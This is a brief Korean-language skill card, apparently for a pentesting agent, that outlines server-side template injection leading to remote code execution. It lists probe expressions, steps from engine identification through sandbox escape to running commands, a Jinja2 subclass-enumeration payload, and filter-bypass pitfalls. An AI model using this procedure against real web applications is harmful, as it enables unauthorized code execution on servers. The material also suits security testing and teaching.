---
name: ssti
description: 템플릿 인젝션으로 RCE
---
## When
`{{7*7}}`류가 평가됨

## Tools
curl

## Procedure
1) 엔진 식별(`{{7*7}}`,`${7*7}`)
2) 샌드박스 탈출
3) RCE 프리미티브
4) 명령

## PoC
```
{{''.__class__.__mro__[1].__subclasses__()}}
```
(Jinja2)

## Pitfalls
엔진별 문법 상이; 필터된 속성 우회
